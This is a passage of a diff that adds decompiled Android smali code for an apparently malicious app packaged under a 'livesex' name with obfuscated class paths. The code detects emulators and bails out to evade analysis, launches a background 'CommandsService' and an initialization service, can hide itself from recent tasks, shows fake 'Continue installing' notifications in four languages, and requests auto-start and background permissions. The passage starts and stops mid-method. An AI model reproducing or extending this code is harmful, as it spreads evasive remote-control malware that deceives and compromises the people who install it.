+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
+
+    const-string v1, "vbox86p"
+
+    .line 315
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
+
+    const-string v1, "emulator"
+
+    .line 316
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
+
+    const-string v1, "simulator"
+
+    .line 317
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_c3
+
+    goto :goto_c5
+
+    :cond_c3
+    const/4 v0, 0x0
+
+    goto :goto_c6
+
+    :cond_c5
+    :goto_c5
+    const/4 v0, 0x1
+
+    :goto_c6
+    return v0
+.end method
+
+.method private isinternetOK(Landroid/content/Context;)Z
+    .registers 3
+
+    const-string v0, "connectivity"
+
+    .line 222
+    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object p1
+
+    check-cast p1, Landroid/net/ConnectivityManager;
+
+    .line 223
+    invoke-virtual {p1}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;
+
+    move-result-object p1
+
+    if-eqz p1, :cond_16
+
+    .line 224
+    invoke-virtual {p1}, Landroid/net/NetworkInfo;->isConnected()Z
+
+    move-result p1
+
+    if-eqz p1, :cond_16
+
+    const/4 p1, 0x1
+
+    return p1
+
+    :cond_16
+    const/4 p1, 0x0
+
+    return p1
+.end method
+
+
+# virtual methods
+.method public Work(Landroid/content/Context;)V
+    .registers 5
+
+    .line 274
+    :try_start_0
+    const-class v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/initializeService;
+
+    invoke-static {v0, p1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/Tools;->NotServiceRunning(Ljava/lang/Class;Landroid/content/Context;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_12
+
+    .line 275
+    new-instance v0, Landroid/content/Intent;
+
+    const-class v1, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/initializeService;
+
+    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 277
+    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 281
+    :cond_12
+    const-class v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/CommandsService;
+
+    invoke-static {v0, p1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/Tools;->NotServiceRunning(Ljava/lang/Class;Landroid/content/Context;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_34
+
+    .line 282
+    new-instance v0, Landroid/content/Intent;
+
+    const-class v1, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/CommandsService;
+
+    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 283
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v2, 0x1a
+
+    if-lt v1, v2, :cond_31
+
+    invoke-static {}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->NeedNotifi()Z
+
+    move-result v1
+
+    if-eqz v1, :cond_31
+
+    .line 285
+    invoke-virtual {p1, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    goto :goto_34
+
+    .line 288
+    :cond_31
+    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    :try_end_34
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_34} :catch_34
+
+    :catch_34
+    :cond_34
+    :goto_34
+    return-void
+.end method
+
+.method public finish()V
+    .registers 3
+
+    .line 789
+    sget-boolean v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/CommandsService;->echo:Z
+
+    if-eqz v0, :cond_f
+
+    .line 791
+    sget-object v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->ActiveNow:Ljava/lang/String;
+
+    const-string v1, " "
+
+    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/CommandsService;->hosekwdxargicianwmuveyamresdiantmtmzkhgiyjrdxirsiu52(Ljava/lang/String;[B)V
+
+    .line 793
+    :cond_f
+    sget-object v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/initializeService;->HideType:Ljava/lang/String;
+
+    const-string v1, "K"
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_1c
+
+    .line 795
+    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V
+
+    :cond_1c
+    return-void
+.end method
+
+.method protected onActivityResult(IILandroid/content/Intent;)V
+    .registers 5
+
+    const/4 v0, 0x1
+
+    if-ne p1, v0, :cond_27
+
+    .line 73
+    iget-object p1, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mUploadMessage:Landroid/webkit/ValueCallback;
+
+    if-eqz p1, :cond_27
+
+    if-eqz p3, :cond_27
+
+    const/4 p1, -0x1
+
+    if-eq p2, p1, :cond_d
+
+    goto :goto_27
+
+    .line 78
+    :cond_d
+    invoke-virtual {p3}, Landroid/content/Intent;->getDataString()Ljava/lang/String;
+
+    move-result-object p1
+
+    const/4 p2, 0x0
+
+    if-eqz p1, :cond_1e
+
+    new-array p3, v0, [Landroid/net/Uri;
+
+    const/4 v0, 0x0
+
+    .line 81
+    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    move-result-object p1
+
+    aput-object p1, p3, v0
+
+    goto :goto_1f
+
+    :cond_1e
+    move-object p3, p2
+
+    .line 84
+    :goto_1f
+    iget-object p1, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mUploadMessage:Landroid/webkit/ValueCallback;
+
+    invoke-interface {p1, p3}, Landroid/webkit/ValueCallback;->onReceiveValue(Ljava/lang/Object;)V
+
+    .line 85
+    iput-object p2, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mUploadMessage:Landroid/webkit/ValueCallback;
+
+    nop
+
+    :cond_27
+    :goto_27
+    return-void
+.end method
+
+.method public onBackPressed()V
+    .registers 2
+
+    .line 761
+    :try_start_0
+    iget-object v0, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    if-eqz v0, :cond_10
+
+    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z
+
+    move-result v0
+
+    if-eqz v0, :cond_10
+
+    .line 762
+    iget-object v0, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V
+
+    goto :goto_17
+
+    .line 764
+    :cond_10
+    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V
+    :try_end_13
+    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_13} :catch_14
+
+    goto :goto_17
+
+    .line 767
+    :catch_14
+    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V
+
+    :goto_17
+    return-void
+.end method
+
+.method public onCreate(Landroid/os/Bundle;)V
+    .registers 19
+
+    move-object/from16 v0, p0
+
+    const-string v1, "zh"
+
+    const-string v2, "tr"
+
+    const-string v3, "en"
+
+    const-string v4, "ar"
+
+    .line 420
+    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+
+    const/4 v5, 0x1
+
+    .line 425
+    invoke-virtual {v0, v5}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->requestWindowFeature(I)Z
+
+    .line 427
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getWindow()Landroid/view/Window;
+
+    move-result-object v6
+
+    const/16 v7, 0x400
+
+    invoke-virtual {v6, v7, v7}, Landroid/view/Window;->setFlags(II)V
+
+    .line 433
+    new-instance v6, Landroid/graphics/Point;
+
+    invoke-direct {v6}, Landroid/graphics/Point;-><init>()V
+
+    .line 434
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getWindowManager()Landroid/view/WindowManager;
+
+    move-result-object v7
+
+    invoke-interface {v7}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;
+
+    move-result-object v7
+
+    invoke-virtual {v7, v6}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V
+
+    .line 435
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v7
+
+    sget-object v8, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->ScreenWidth:Ljava/lang/String;
+
+    new-instance v9, Ljava/lang/StringBuilder;
+
+    const-string v10, ""
+
+    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    iget v11, v6, Landroid/graphics/Point;->x:I
+
+    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-static {v7, v8, v9}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 436
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v7
+
+    sget-object v8, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->ScreenHight:Ljava/lang/String;
+
+    new-instance v9, Ljava/lang/StringBuilder;
+
+    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    iget v6, v6, Landroid/graphics/Point;->y:I
+
+    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v6
+
+    invoke-static {v7, v8, v6}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
+
+    const/high16 v6, 0x800000
+
+    const/high16 v7, 0x10000000
+
+    const/4 v9, 0x3
+
+    const/4 v10, 0x2
+
+    .line 439
+    :try_start_60
+    invoke-static {}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->Anti_emu()Z
+
+    move-result v12
+    :try_end_64
+    .catch Ljava/lang/Exception; {:try_start_60 .. :try_end_64} :catch_202
+
+    if-eqz v12, :cond_74
+
+    :try_start_66
+    invoke-direct/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->isEmu_DIV_ID_lator()Z
+
+    move-result v12
+
+    if-eqz v12, :cond_74
+
+    .line 441
+    invoke-direct/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->AsknoEmu()V
+    :try_end_6f
+    .catch Ljava/lang/Exception; {:try_start_66 .. :try_end_6f} :catch_70
+
+    return-void
+
+    :catch_70
+    nop
+
+    const/4 v11, 0x3
+
+    goto/16 :goto_204
+
+    .line 445
+    :cond_74
+    :try_start_74
+    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;
+
+    move-result-object v12
+
+    invoke-virtual {v12}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;
+
+    move-result-object v12
+
+    .line 446
+    invoke-virtual {v12}, Ljava/lang/String;->hashCode()I
+
+    move-result v13
+    :try_end_80
+    .catch Ljava/lang/Exception; {:try_start_74 .. :try_end_80} :catch_202
+
+    const/16 v14, 0xf2e
+
+    const/16 v15, 0xe7e
+
+    const/16 v8, 0xca9
+
+    const/16 v11, 0xc31
+
+    if-eq v13, v11, :cond_a9
+
+    if-eq v13, v8, :cond_a1
+
+    if-eq v13, v15, :cond_99
+
+    if-eq v13, v14, :cond_91
+
+    goto :goto_b1
+
+    :cond_91
+    :try_start_91
+    invoke-virtual {v12, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v13
+
+    if-eqz v13, :cond_b1
+
+    const/4 v13, 0x2
+
+    goto :goto_b2
+
+    :cond_99
+    invoke-virtual {v12, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v13
+
+    if-eqz v13, :cond_b1
+
+    const/4 v13, 0x3
+
+    goto :goto_b2
+
+    :cond_a1
+    invoke-virtual {v12, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v13
+    :try_end_a5
+    .catch Ljava/lang/Exception; {:try_start_91 .. :try_end_a5} :catch_70
+
+    if-eqz v13, :cond_b1
+
+    const/4 v13, 0x0
+
+    goto :goto_b2
+
+    :cond_a9
+    :try_start_a9
+    invoke-virtual {v12, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v13
+    :try_end_ad
+    .catch Ljava/lang/Exception; {:try_start_a9 .. :try_end_ad} :catch_202
+
+    if-eqz v13, :cond_b1
+
+    const/4 v13, 0x1
+
+    goto :goto_b2
+
+    :cond_b1
+    :goto_b1
+    const/4 v13, -0x1
+
+    :goto_b2
+    if-eqz v13, :cond_d6
+
+    if-eq v13, v5, :cond_cd
+
+    if-eq v13, v10, :cond_c4
+
+    if-eq v13, v9, :cond_bb
+
+    goto :goto_de
+
+    :cond_bb
+    :try_start_bb
+    const-string v13, "kuruluma devam et"
+
+    .line 460
+    sput-object v13, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->completeinstallnotifi_title:Ljava/lang/String;
+
+    const-string v13, "Kuruluma devam etmek için buraya tıklayın"
+
+    .line 461
+    sput-object v13, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->completeinstallnotifi_msg:Ljava/lang/String;
+
+    goto :goto_de
+
+    :cond_c4
+    const-string v13, "继续安装"
+
+    .line 456
+    sput-object v13, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->completeinstallnotifi_title:Ljava/lang/String;
+
+    const-string v13, "单击此处继续安装"
+
+    .line 457
+    sput-object v13, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->completeinstallnotifi_msg:Ljava/lang/String;
+
+    goto :goto_de
+
+    :cond_cd
+    const-string v13, "مواصلة التثبيت"
+
+    .line 452
+    sput-object v13, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->completeinstallnotifi_title:Ljava/lang/String;
+
+    const-string v13, "انقر هنا لمتابعة التثبيت"
+
+    .line 453
+    sput-object v13, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->completeinstallnotifi_msg:Ljava/lang/String;
+    :try_end_d5
+    .catch Ljava/lang/Exception; {:try_start_bb .. :try_end_d5} :catch_70
+
+    goto :goto_de
+
+    :cond_d6
+    :try_start_d6
+    const-string v13, "Continue installing"
+
+    .line 448
+    sput-object v13, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->completeinstallnotifi_title:Ljava/lang/String;
+
+    const-string v13, "Click Here to Continue installing"
+
+    .line 449
+    sput-object v13, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->completeinstallnotifi_msg:Ljava/lang/String;
+
+    .line 466
+    :goto_de
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v13
+
+    .line 467
+    invoke-virtual {v13}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;
+
+    move-result-object v13
+
+    const v9, 0x7f0c033d
+
+    invoke-virtual {v13, v9}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    sput-object v9, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->pr:Ljava/lang/String;
+
+    .line 472
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v9
+
+    sget-object v13, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->Cantgo:Ljava/lang/String;
+
+    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;
+
+    move-result-object v10
+
+    invoke-static {v9, v13, v10}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z
+
+    move-result v9
+    :try_end_fd
+    .catch Ljava/lang/Exception; {:try_start_d6 .. :try_end_fd} :catch_202
+
+    if-eqz v9, :cond_119
+
+    .line 475
+    :try_start_ff
+    new-instance v8, Landroid/content/Intent;
+
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v9
+
+    const-class v10, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/SecondActivity;
+
+    invoke-direct {v8, v9, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 476
+    invoke-virtual {v8, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    .line 477
+    invoke-virtual {v8, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    const/high16 v9, 0x40000000  # 2.0f
+
+    .line 478
+    invoke-virtual {v8, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    .line 479
+    invoke-virtual {v0, v8}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->startActivity(Landroid/content/Intent;)V
+    :try_end_118
+    .catch Ljava/lang/Exception; {:try_start_ff .. :try_end_118} :catch_70
+
+    return-void
+
+    .line 484
+    :cond_119
+    :try_start_119
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v9
+
+    invoke-static {v9}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->SetJob(Landroid/content/Context;)V
+
+    .line 485
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v9
+    :try_end_124
+    .catch Ljava/lang/Exception; {:try_start_119 .. :try_end_124} :catch_202
+
+    .line 489
+    :try_start_124
+    invoke-static {}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/AutoStart;->getInstance()Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/AutoStart;
+
+    move-result-object v10
+
+    .line 490
+    invoke-static {}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->NeedAutoStart()Z
+
+    move-result v13
+
+    if-eqz v13, :cond_1de
+
+    .line 491
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v13
+
+    sget-object v6, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->AutoStartOn:Ljava/lang/String;
+
+    const/16 v16, 0x0
+
+    invoke-static/range {v16 .. v16}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;
+
+    move-result-object v7
+
+    invoke-static {v13, v6, v7}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z
+
+    move-result v6
+
+    if-nez v6, :cond_1de
+
+    .line 492
+    invoke-virtual {v10, v9}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/AutoStart;->isAutoStartPermissionAvailable(Landroid/content/Context;)Z
+
+    move-result v6
+
+    if-eqz v6, :cond_1de
+
+    .line 496
+    new-instance v6, Landroid/app/AlertDialog$Builder;
+
+    new-instance v7, Landroid/view/ContextThemeWrapper;
+
+    const v13, 0x7f0d0002
+
+    invoke-direct {v7, v0, v13}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V
+
+    invoke-direct {v6, v7}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V
+
+    .line 502
+    invoke-virtual {v12}, Ljava/lang/String;->hashCode()I
+
+    move-result v7
+
+    if-eq v7, v11, :cond_178
+
+    if-eq v7, v8, :cond_170
+
+    if-eq v7, v15, :cond_168
+
+    if-eq v7, v14, :cond_160
+
+    goto :goto_180
+
+    :cond_160
+    invoke-virtual {v12, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v7
+
+    if-eqz v7, :cond_180
+
+    const/4 v7, 0x2
+
+    goto :goto_181
+
+    :cond_168
+    invoke-virtual {v12, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v7
+
+    if-eqz v7, :cond_180
+
+    const/4 v7, 0x3
+
+    goto :goto_181
+
+    :cond_170
+    invoke-virtual {v12, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v7
+
+    if-eqz v7, :cond_180
+
+    const/4 v7, 0x0
+
+    goto :goto_181
+
+    :cond_178
+    invoke-virtual {v12, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v7
+    :try_end_17c
+    .catch Ljava/lang/Exception; {:try_start_124 .. :try_end_17c} :catch_1de
+
+    if-eqz v7, :cond_180
+
+    const/4 v7, 0x1
+
+    goto :goto_181
+
+    :cond_180
+    :goto_180
+    const/4 v7, -0x1
+
+    :goto_181
+    const-string v8, "this App request Auto Start/Run in Background Permission to work properly"
+
+    if-eqz v7, :cond_1ad
+
+    if-eq v7, v5, :cond_1a4
+
+    const/4 v11, 0x2
+
+    if-eq v7, v11, :cond_19b
+
+    const/4 v11, 0x3
+
+    if-eq v7, v11, :cond_193
+
+    :try_start_18d
+    const-string v7, "OK"
+
+    .line 526
+    invoke-virtual {v6, v8}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    goto :goto_1b3
+
+    :cond_193
+    const-string v7, "Tamam"
+
+    const-string v8, "Bu uygulama, düzgün çalışması için hem otomatik başlatma hem de arka planda çalıştırma izinlerini ister"
+
+    .line 521
+    invoke-virtual {v6, v8}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    goto :goto_1b3
+
+    :cond_19b
+    const/4 v11, 0x3
+
+    const-string v7, "好的"
+
+    const-string v8, "此应用程序请求自动启动和在后台运行权限才能正常工作"
+
+    .line 516
+    invoke-virtual {v6, v8}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    goto :goto_1b3
+
+    :cond_1a4
+    const/4 v11, 0x3
+
+    const-string v7, "موافق"
+
+    const-string v8, "يطلب هذا التطبيق كلاً من بدء التشغيل التلقائي والتشغيل في أذونات الخلفية للعمل بشكل صحيح"
+
+    .line 511
+    invoke-virtual {v6, v8}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    goto :goto_1b3
+
+    :cond_1ad
+    const/4 v11, 0x3
+
+    const-string v7, "ok"
+
+    .line 506
+    invoke-virtual {v6, v8}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+    :try_end_1b3
+    .catch Ljava/lang/Exception; {:try_start_18d .. :try_end_1b3} :catch_1df
+
+    .line 532
+    :goto_1b3
+    :try_start_1b3
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v8
+
